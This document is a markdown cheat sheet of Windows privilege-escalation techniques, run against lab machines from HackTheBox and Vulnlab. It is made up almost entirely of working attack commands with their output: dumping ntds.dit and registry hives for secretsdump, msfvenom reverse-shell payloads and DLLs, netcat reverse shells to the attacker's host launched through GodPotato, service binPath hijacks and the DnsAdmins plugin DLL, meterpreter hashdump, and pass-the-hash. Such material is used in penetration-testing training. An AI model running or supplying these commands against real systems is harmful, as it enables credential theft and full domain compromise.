# Privileges
## SeBackupPrivilege
```powershell
*Evil-WinRM* PS C:\Users\Caroline.Robinson\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
...
SeBackupPrivilege             Back up files and directories  Enabled
...
```
### Disk Shadow method
```
set context persistent nowriters 
add volume c: alias pwn 
create 
expose %pwn% z: 
```
```powershell
*Evil-WinRM* PS C:\temp> upload pwn.txt
```
```powershell
*Evil-WinRM* PS C:\temp> type pwn.txt
set context persistent nowriters 
add volume c: alias pwn 
create 
expose %pwn% z: 
```
```powershell
*Evil-WinRM* PS C:\temp> diskshadow /s pwn.txt
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  BABYDC,  8/9/2024 10:57:34 PM

-> set context persistent nowriters
-> add volume c: alias pwn
-> create
Alias pwn for shadow ID {041d93f3-797d-4f91-a270-5c1fb66092e6} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {7df9215a-2efb-4a28-befe-cbaf15deba8c} set as environment variable.

Querying all shadow copies with the shadow copy set ID {7df9215a-2efb-4a28-befe-cbaf15deba8c}

        * Shadow copy ID = {041d93f3-797d-4f91-a270-5c1fb66092e6}               %pwn%
                - Shadow copy set: {7df9215a-2efb-4a28-befe-cbaf15deba8c}       %VSS_SHADOW_SET%
                - Original count of shadow copies = 1
                - Original volume name: \\?\Volume{1b77e212-0000-0000-0000-100000000000}\ [C:\]
                - Creation time: 8/9/2024 10:57:36 PM
                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
                - Originating machine: BabyDC.baby.vl
                - Service machine: BabyDC.baby.vl
                - Not exposed
                - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
                - Attributes:  No_Auto_Release Persistent No_Writers Differential

Number of shadow copies listed: 1
-> expose %pwn% z:
-> %pwn% = {041d93f3-797d-4f91-a270-5c1fb66092e6}
The shadow copy was successfully exposed as z:\.
->
```
```powershell
*Evil-WinRM* PS C:\temp> robocopy /b z:\windows\ntds . ntds.dit

-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows
-------------------------------------------------------------------------------

  Started : Friday, August 9, 2024 10:57:58 PM
   Source : z:\windows\ntds\
     Dest : C:\temp\

    Files : ntds.dit

  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30

------------------------------------------------------------------------------

                           1    z:\windows\ntds\
            New File              16.0 m        ntds.dit

[snipped]
```
```powershell
*Evil-WinRM* PS C:\temp> reg save HKLM\SYSTEM c:\temp\system
The operation completed successfully.
```
```powershell
*Evil-WinRM* PS C:\temp> download system

Info: Downloading C:\temp\system to system

Info: Download successful!
```
```powershell
*Evil-WinRM* PS C:\temp> download ntds.dit

Info: Downloading C:\temp\ntds.dit to ntds.dit

Info: Download successful!
```
```
➜  secretsdump.py -system system -ntds ntds.dit local
```
## SeLoadDriverPrivilege
-> https://github.com/k4sth4/SeLoadDriverPrivilege
```bash
➜  msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o shell.exe
```
```powershell
*Evil-WinRM* PS C:\temp> upload Capcom.sys
*Evil-WinRM* PS C:\temp> upload ExploitCapcom.exe
*Evil-WinRM* PS C:\temp> upload eoploaddriver_x64.exe
*Evil-WinRM* PS C:\temp> upload shell.exe
```
```powershell
*Evil-WinRM* PS C:\temp> .\eoploaddriver_x64.exe System\CurrentControlSet\dfserv C:\temp\Capcom.sys
```
```powershell
*Evil-WinRM* PS C:\temp> .\ExploitCapcom.exe LOAD \temp\Capcom.sys
```
```powershell
*Evil-WinRM* PS C:\temp> .\ExploitCapcom.exe EXPLOIT .\shell.exe
```
## SeImpersonatePrivilege
```powershell
C:\Windows\system32>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
...
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
...
```
```powershell
PS C:\programdata> iwr http://<tun0>/GodPotato-NET4.exe -outfile gp.exe
```
```powershell
PS C:\programdata> .\gp.exe -cmd "C:\Users\Public\nc64.exe -e cmd.exe <tun0> <port>"
[*] CombaseModule: 0x140733127524352
[*] DispatchTable: 0x140733130111304
[*] UseProtseqFunction: 0x140733129406688
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] CreateNamedPipe \\.\pipe\eb27b3cc-7b5a-420d-8f01-d3094f6ee323\pipe\epmapper
[*] Trigger RPCSS
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 00000402-0d08-ffff-8e84-859d1b28d501
[*] DCOM obj OXID: 0xd402854b19147ceb
[*] DCOM obj OID: 0x20ef4be3bfc76a84
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 892 Token:0x496  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 3040
```
```powershell
➜  nc -nlvp 443
listening on [any] 443 ...
connect to [10.8.0.210] from (UNKNOWN) [10.10.150.182] 54910
Microsoft Windows [Version 10.0.20348.2340]
(c) Microsoft Corporation. All rights reserved.

C:\programdata>whoami
nt authority\system
```
## SeDebugPrivilege
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp -ax64 -f exe LHOST=<ip> LPORT=<port> -o shell.exe
```
```powershell
PS C:\temp> iwr http://<ip>/shell.exe -outfile shell.exe
PS C:\temp> .\shell.exe
```
```bash
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set lhost tun0
msf6 exploit(multi/handler) > set lport 443
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on <attacker_ip>:<port>
[*] Sending stage (200774 bytes) to <target_ip>
[*] Meterpreter session 1 opened [SNIP]
```
```bash
meterpreter > hashdump
```
```bash
meterpreter > portfwd add -L 127.0.0.1 -l 445 -p 445 -r <target_ip>
```
```bash
impacket-smbexec administrator@127.0.0.1 -hashes :<hash>
```
## SeTcbPrivilege
```bash
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                         State
============================= =================================== =======
...
SeTcbPrivilege                Act as part of the operating system Enabled
...
```
-> https://gist.github.com/antonioCoco/19563adef860614b56d010d92e67d178
```powershell
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> iwr http://<tun0>/TcbElevation.exe -outfile TcbElevation.exe
```
-> https://github.com/xct/rcat
```powershell
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> upload rcat_10.8.0.210_443.exe
```
```powershell
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> .\TcbElevation.exe pwn "C:\Windows\system32\cmd.exe /c C:\Users\svc_deploy\Documents\rcat_10.8.0.210_443.exe"
Error starting service 1053
```
```bash
➜  rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [10.8.0.210] from (UNKNOWN) [10.10.153.117] 53924
Microsoft Windows [Version 10.0.20348.2113]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```
# Groups
## Server Operators Group
Its members can sign-in to a server, start and stop services, access domain controllers, perform maintenance tasks (such as backup and restore), and they have the ability to change binaries that are installed on the domain controllers.
```powershell
*Evil-WinRM* PS C:\temp> net user svc-printer
...
Local Group Memberships      *Print Operators      *Remote Management Use
                             *Server Operators
Global Group memberships     *Domain Users
```
```powershell
*Evil-WinRM* PS C:\temp> upload nc64.exe
```
```powershell
*Evil-WinRM* PS C:\temp> sc.exe config VMTools binPath="C:\temp\nc64.exe -e powershell.exe <tun0> <port>"
[SC] ChangeServiceConfig SUCCESS
```
```powershell
*Evil-WinRM* PS C:\temp> sc.exe stop VMTools

SERVICE_NAME: VMTools
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 1  STOPPED
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
```
```powershell
*Evil-WinRM* PS C:\temp> sc.exe start VMTools
```
```bash
➜  rlwrap nc -nlvp 9001
listening on [any] 9001 ...
connect to [10.10.14.30] from (UNKNOWN) [10.10.11.108] 49634
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> whoami
nt authority\system
```
## DnsAdmins Group
-> https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise
When we are member of this group we can ask the machine to load an arbitrary DLL file when the service starts so that gives us RCE as SYSTEM. We can re-configure the service and we have the required privileges to restart it.
```bash
➜  msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f dll -o shell.dll
```
```powershell
*Evil-WinRM* PS C:\temp> upload shell.dll
```
```powershell
*Evil-WinRM* PS C:\temp> cmd /c 'dnscmd <DC> /config /serverlevelplugindll C:\temp\shell.dll'

Registry property serverlevelplugindll successfully reset.
Command completed successfully.
```
```powershell
*Evil-WinRM* PS C:\temp> sc.exe \\<DC> stop dns

SERVICE_NAME: dns 
        TYPE               : 10  WIN32_OWN_PROCESS  
        STATE              : 3  STOP_PENDING 
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
```
```powershell
*Evil-WinRM* PS C:\temp> sc.exe \\<DC> start dns

SERVICE_NAME: dns 
        TYPE               : 10  WIN32_OWN_PROCESS  
        STATE              : 2  START_PENDING 
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 3500
        FLAGS
```
```bash
➜  rlwrap nc -nlvp 9001
...

PS C:\Windows\system32> whoami
nt authority\system
```
# Resources
- https://x.com/fr0gger_/status/1379465943965909000
- https://www.hackingarticles.in/windows-privilege-escalation-server-operator-group/
- https://github.com/k4sth4/SeLoadDriverPrivilege
- https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/access-tokens
- https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens
- https://x.com/splinter_code/status/1568548572861267968
- https://gist.github.com/antonioCoco/19563adef860614b56d010d92e67d178
- https://snowscan.io/htb-writeup-blackfield/
- https://snowscan.io/htb-writeup-resolute/
- https://www.thehacker.recipes/a-d/movement/domain-settings/builtin-groups
- https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise
## Machines to try:
- Baby (Vulnlab)
- Blackfield (HackTheBox)
- Resolute (HackTheBox)
- Fuse (HackTheBox)
- POV (HackTheBox)
- Job (Vulnlab)
- Sidecar (Vulnlab)
